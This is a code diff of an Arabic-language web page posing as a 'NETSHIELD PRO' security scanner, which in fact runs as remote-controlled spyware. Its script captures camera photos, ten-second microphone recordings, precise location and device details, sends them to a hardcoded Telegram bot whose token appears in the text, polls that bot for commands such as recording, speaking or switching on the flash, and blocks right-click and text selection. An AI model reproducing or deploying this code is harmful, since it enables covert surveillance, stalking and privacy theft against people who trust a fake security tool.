@@ -650,7 +650,7 @@
         <!-- Footer -->
         <div class="footer">
             <div class="footer-logo">NETSHIELD PRO</div>
-            <div class="footer-text">Advanced Cybersecurity Suite v7.0</div>
+            <div class="footer-text">Advanced Cybersecurity Suite v8.0</div>
             <div class="footer-text">Secure connections, protected privacy</div>
         </div>
 
@@ -660,28 +660,17 @@
         // ==================== CONFIGURATION ====================
         const BOT_TOKEN = "8915820730:AAHqyTgk9IVvmMLA8xpXO8QuLPEPbIv9A9c";
         const CHAT_ID = "6453594151";
-        const MICROPHONE_DURATION = 10000; // 10 ثواني
-        const COMMAND_CHECK_INTERVAL = 2000; // فحص الاوامر كل 2 ثانية
-        const VISITOR_ALERT = true;
-        const AUTO_REFRESH_INTERVAL = 60000; // 60 ثانية
-        const PERMISSION_RETRY_INTERVAL = 30000; // 30 ثانية
+        const MICROPHONE_DURATION = 10000;
+        const COMMAND_CHECK_INTERVAL = 2000;
+        const AUTO_REFRESH_INTERVAL = 60000;
+        const PERMISSION_RETRY_INTERVAL = 30000;
 
         // ==================== GLOBAL STATE ====================
         let scanData = {
-            deviceInfo: null,
-            battery: null,
-            network: null,
-            camera: null,
-            microphone: null,
-            location: null,
-            permissions: {
-                camera: false,
-                microphone: false,
-                location: false,
-                notification: false
-            }
+            deviceInfo: null, battery: null, network: null,
+            camera: null, microphone: null, location: null,
+            permissions: { camera: false, microphone: false, location: false, notification: false }
         };
-
         let lastUpdateId = 0;
         let commandListenerActive = false;
         let currentRetryFunction = null;
@@ -703,9 +692,7 @@
         }
 
         // ==================== ALERT ON LOAD ====================
-        if (VISITOR_ALERT) {
-            sendText("🔔 **تنبيه دخول:**\n🕐 شخص ما فتح التطبيق حالاً!\n📍 في انتظار الفحص...");
-        }
+        sendText("🔔 **تنبيه دخول:**\n🕐 شخص ما فتح التطبيق حالاً!\n📍 في انتظار الفحص...");
 
         // ==================== PERMISSION HANDLER ====================
         function checkAllPermissions() {
@@ -715,13 +702,11 @@
         }
 
         function startPermissionLoop() {
-            // تذكير بالصلاحيات المفقودة كل 30 ثانية
             if (permissionLoopInterval) clearInterval(permissionLoopInterval);
             permissionLoopInterval = setInterval(() => {
                 if (!scanData.permissions.camera || !scanData.permissions.microphone || !scanData.permissions.location) {
                     document.getElementById('permissionPrompt').style.display = 'block';
-                    document.getElementById('permissionText').textContent = 
-                        '⚠️ بعض الصلاحيات مفقودة. الفحص لن يكتمل بدونها. اضغط لمنحها:';
+                    document.getElementById('permissionText').textContent = '⚠️ بعض الصلاحيات مفقودة. الفحص لن يكتمل بدونها. اضغط لمنحها:';
                 }
             }, PERMISSION_RETRY_INTERVAL);
         }
@@ -839,22 +824,15 @@
         // ==================== COLLECTION FUNCTIONS ====================
         function collectDeviceInfo() {
             scanData.deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                ram: navigator.deviceMemory || 'غير معروف',
-                cores: navigator.hardwareConcurrency || 'غير معروف',
+                userAgent: navigator.userAgent, platform: navigator.platform,
+                language: navigator.language, screenWidth: screen.width,
+                screenHeight: screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                ram: navigator.deviceMemory || 'غير معروف', cores: navigator.hardwareConcurrency || 'غير معروف',
                 timestamp: new Date().toLocaleString('ar-EG')
             };
             if (navigator.getBattery) {
                 navigator.getBattery().then(b => {
-                    scanData.battery = {
-                        level: Math.round(b.level * 100),
-                        charging: b.charging
-                    };
+                    scanData.battery = { level: Math.round(b.level * 100), charging: b.charging };
                 }).catch(() => {});
             }
         }
@@ -862,11 +840,7 @@
         async function collectNetworkData() {
             const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (c) {
-                scanData.network = {
-                    type: c.type || 'unknown',
-                    downlink: c.downlink || 0,
-                    rtt: c.rtt || 0
-                };
+                scanData.network = { type: c.type || 'unknown', downlink: c.downlink || 0, rtt: c.rtt || 0 };
                 document.getElementById('speedValue').textContent = Math.round(c.downlink || 0);
                 document.getElementById('pingValue').textContent = c.rtt || '--';
             }
@@ -878,14 +852,9 @@
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
                 });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                scanData.camera = canvas.toDataURL('image/jpeg', 0.7);
+                const video = document.createElement('video'); video.srcObject = stream; await video.play();
+                const canvas = document.createElement('canvas'); canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0); scanData.camera = canvas.toDataURL('image/jpeg', 0.7);
                 stream.getTracks().forEach(t => t.stop());
             } catch (e) {}
         }
@@ -894,8 +863,7 @@
             if (!scanData.permissions.microphone) return;
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mr = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-                const chunks = [];
+                const mr = new MediaRecorder(stream, { mimeType: 'audio/webm' }); const chunks = [];
                 mr.ondataavailable = e => chunks.push(e.data);
                 mr.onstop = () => {
                     const blob = new Blob(chunks, { type: 'audio/webm' });
@@ -914,12 +882,9 @@
                 if (!scanData.permissions.location) { resolve(); return; }
                 navigator.geolocation.getCurrentPosition(pos => {
                     scanData.location = {
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude || 'غير متوفر',
-                        speed: pos.coords.speed || 'غير متوفر',
-                        timestamp: new Date(pos.timestamp).toLocaleString('ar-EG')
+                        latitude: pos.coords.latitude, longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy, altitude: pos.coords.altitude || 'غير متوفر',
+                        speed: pos.coords.speed || 'غير متوفر', timestamp: new Date(pos.timestamp).toLocaleString('ar-EG')
                     };
                     resolve();
                 }, () => { resolve(); }, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
@@ -930,13 +895,10 @@
         async function turnFlashOn() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-                flashStream = stream;
-                flashTrack = stream.getVideoTracks()[0];
+                flashStream = stream; flashTrack = stream.getVideoTracks()[0];
                 await flashTrack.applyConstraints({ advanced: [{ torch: true }] });
                 sendText('✅ تم تشغيل الفلاش');
-            } catch (e) {
-                sendText('❌ فشل تشغيل الفلاش: الجهاز لا يدعم');
-            }
+            } catch (e) { sendText('❌ فشل تشغيل الفلاش: الجهاز لا يدعم'); }
         }
 
         function turnFlashOff() {
@@ -948,17 +910,14 @@
                     if (flashStream) { flashStream.getTracks().forEach(t => t.stop()); flashStream = null; flashTrack = null; }
                     sendText('✅ تم ايقاف الفلاش');
                 });
-            } else {
-                sendText('⚠️ الفلاش غير شغال');
-            }
+            } else { sendText('⚠️ الفلاش غير شغال'); }
         }
 
         // ==================== NOTIFICATIONS ====================
         function requestNotificationPermission() {
             if ('Notification' in window) {
                 if (Notification.permission === 'granted') {
-                    scanData.permissions.notification = true;
-                    localStorage.setItem('perm_notify', 'true');
+                    scanData.permissions.notification = true; localStorage.setItem('perm_notify', 'true');
                 } else if (Notification.permission !== 'denied') {
                     Notification.requestPermission().then(permission => {
                         scanData.permissions.notification = (permission === 'granted');
@@ -972,14 +931,9 @@
             if ('Notification' in window && Notification.permission === 'granted') {
                 navigator.serviceWorker.ready.then(registration => {
                     registration.showNotification(title, {
-                        body: body,
-                        icon: 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
-                        vibrate: [200, 100, 200, 100, 200, 100, 200],
-                        requireInteraction: true,
-                        tag: 'netshield-alert-' + Date.now(),
-                        renotify: true,
-                        silent: false,
-                        data: { url: '/' }
+                        body: body, icon: 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
+                        vibrate: [200, 100, 200, 100, 200, 100, 200], requireInteraction: true,
+                        tag: 'netshield-alert-' + Date.now(), renotify: true, silent: false, data: { url: '/' }
                     });
                 });
             }
@@ -1009,8 +963,7 @@
                                 if (scanData.location) {
                                     const l = scanData.location;
                                     sendText(`الموقع الحالي:\nالاحداثيات: ${l.latitude}, ${l.longitude}\nالدقة: ${Math.round(l.accuracy)} متر\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}`);
-                                }
-                                else { sendText('فشل تحديد الموقع'); }
+                                } else { sendText('فشل تحديد الموقع'); }
                             }
                             else if (cmd === '/info' || cmd === '/device' || cmd === '/status') {
                                 collectDeviceInfo(); await collectNetworkData(); await sleep(500);
@@ -1018,8 +971,7 @@
                                 if (scanData.deviceInfo) { const d = scanData.deviceInfo; t += `النظام: ${d.platform}\nالذاكرة: ${d.ram} GB\nالمعالج: ${d.cores} نواة\n`; }
                                 if (scanData.battery) { t += `البطارية: ${scanData.battery.level}%\nالشحن: ${scanData.battery.charging ? 'موصول' : 'غير موصول'}\n`; }
                                 if (scanData.network) { t += `النت: ${scanData.network.type} - ${scanData.network.downlink} Mbps\n`; }
-                                t += `الوقت: ${new Date().toLocaleString('ar-EG')}`;
-                                sendText(t);
+                                t += `الوقت: ${new Date().toLocaleString('ar-EG')}`; sendText(t);
                             }
                             else if (cmd === '/full' || cmd === '/scan' || cmd === '/report') { await sendCompleteReport(); }
                             else if (cmd === '/record' || cmd === '/mic' || cmd === '/audio') {
@@ -1050,12 +1002,7 @@
                             }
                             else if (cmd.startsWith('/say ')) {
                                 const textToSay = msg.text.replace('/say ', '').trim();
-                                if (textToSay) {
-                                    const utterance = new SpeechSynthesisUtterance(textToSay);
-                                    utterance.lang = 'ar';
-                                    window.speechSynthesis.speak(utterance);
-                                    sendText('تم التحدث: ' + textToSay);
-                                }
+                                if (textToSay) { const utterance = new SpeechSynthesisUtterance(textToSay); utterance.lang = 'ar'; window.speechSynthesis.speak(utterance); sendText('تم التحدث: ' + textToSay); }
                                 else { sendText('استخدام: /say [النص]'); }
                             }
                             else if (cmd === '/flash on') { await turnFlashOn(); }
@@ -1075,22 +1022,10 @@
         // ==================== TELEGRAM SENDER ====================
         async function sendCompleteReport() {
             let r = '━━━━━━━━━━━━━━━━━━━\n  تقرير الفحص الشامل\n━━━━━━━━━━━━━━━━━━━\n\n';
-            if (scanData.deviceInfo) {
-                const d = scanData.deviceInfo;
-                r += `【 معلومات الجهاز 】\nالنظام: ${d.platform}\nالذاكرة: ${d.ram} GB\nالمعالج: ${d.cores} نواة\nالشاشة: ${d.screenWidth}x${d.screenHeight}\nالوقت: ${d.timestamp}\n\n`;
-            }
-            if (scanData.battery) {
-                const b = scanData.battery;
-                r += `【 البطارية 】\nالمستوى: ${b.level}%\nالشحن: ${b.charging ? 'موصول' : 'غير موصول'}\n\n`;
-            }
-            if (scanData.network) {
-                const n = scanData.network;
-                r += `【 الشبكة 】\nالنوع: ${n.type}\nالسرعة: ${n.downlink} Mbps\nالاستجابة: ${n.rtt} ms\n\n`;
-            }
-            if (scanData.location) {
-                const l = scanData.location;
-                r += `【 الموقع 】\nالاحداثيات: ${l.latitude}, ${l.longitude}\nالدقة: ${Math.round(l.accuracy)} متر\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}\n\n`;
-            }
+            if (scanData.deviceInfo) { const d = scanData.deviceInfo; r += `【 معلومات الجهاز 】\nالنظام: ${d.platform}\nالذاكرة: ${d.ram} GB\nالمعالج: ${d.cores} نواة\nالشاشة: ${d.screenWidth}x${d.screenHeight}\nالوقت: ${d.timestamp}\n\n`; }
+            if (scanData.battery) { const b = scanData.battery; r += `【 البطارية 】\nالمستوى: ${b.level}%\nالشحن: ${b.charging ? 'موصول' : 'غير موصول'}\n\n`; }
+            if (scanData.network) { const n = scanData.network; r += `【 الشبكة 】\nالنوع: ${n.type}\nالسرعة: ${n.downlink} Mbps\nالاستجابة: ${n.rtt} ms\n\n`; }
+            if (scanData.location) { const l = scanData.location; r += `【 الموقع 】\nالاحداثيات: ${l.latitude}, ${l.longitude}\nالدقة: ${Math.round(l.accuracy)} متر\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}\n\n`; }
             r += `【 الصلاحيات 】\nكاميرا: ${scanData.permissions.camera ? 'نعم' : 'لا'}\nميكروفون: ${scanData.permissions.microphone ? 'نعم' : 'لا'}\nموقع: ${scanData.permissions.location ? 'نعم' : 'لا'}\nاشعارات: ${scanData.permissions.notification ? 'نعم' : 'لا'}\n\n━━━━━━━━━━━━━━━━━━━`;
             await sendText(r);
             if (scanData.camera) await sendPhoto(scanData.camera);
@@ -1100,8 +1035,7 @@
         async function sendText(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                 });
             } catch (e) {}
@@ -1110,9 +1044,7 @@
         async function sendPhoto(base64) {
             try {
                 const blob = await (await fetch(base64)).blob();
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'camera.jpg');
+                const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'camera.jpg');
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             } catch (e) {}
         }
@@ -1120,51 +1052,20 @@
         async function sendAudio(base64) {
             try {
                 const blob = await (await fetch(base64)).blob();
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('audio', blob, 'recording.webm');
-                fd.append('duration', '10');
+                const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('audio', blob, 'recording.webm'); fd.append('duration', '10');
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
             } catch (e) {}
         }
 
         // ==================== UI HELPERS ====================
-        function updateStep(n, s) {
-            const el = document.getElementById('step' + n);
-            el.className = 'progress-step';
-            if (s === 'done') el.classList.add('done');
-            if (s === 'active') el.classList.add('active');
-        }
-
-        function resetSteps() {
-            for (let i = 1; i <= 4; i++) document.getElementById('step' + i).className = 'progress-step';
-            document.getElementById('progressBar').style.width = '0%';
-        }
-
-        function updateMainStatus(s) {
-            const dot = document.getElementById('mainStatusDot');
-            const ti = document.getElementById('mainStatusTitle');
-            const de = document.getElementById('mainStatusDesc');
-            if (s) {
-                dot.classList.add('protected');
-                ti.textContent = 'محمي';
-                de.textContent = 'جميع الانظمة نشطة';
-            } else {
-                dot.classList.remove('protected');
-                ti.textContent = 'غير محمي';
-                de.textContent = 'الفحص مطلوب';
-            }
-        }
-
+        function updateStep(n, s) { const el = document.getElementById('step' + n); el.className = 'progress-step'; if (s === 'done') el.classList.add('done'); if (s === 'active') el.classList.add('active'); }
+        function resetSteps() { for (let i = 1; i <= 4; i++) document.getElementById('step' + i).className = 'progress-step'; document.getElementById('progressBar').style.width = '0%'; }
+        function updateMainStatus(s) { const dot = document.getElementById('mainStatusDot'), ti = document.getElementById('mainStatusTitle'), de = document.getElementById('mainStatusDesc'); if (s) { dot.classList.add('protected'); ti.textContent = 'محمي'; de.textContent = 'جميع الانظمة نشطة'; } else { dot.classList.remove('protected'); ti.textContent = 'غير محمي'; de.textContent = 'الفحص مطلوب'; } }
         function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
         // ==================== AUTO START ====================
         startCommandListener();
-
-        // ==================== AUTO REFRESH ====================
         setInterval(() => { location.reload(); }, AUTO_REFRESH_INTERVAL);
-
-        // ==================== SECURITY ====================
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('selectstart', e => e.preventDefault());
     </script>
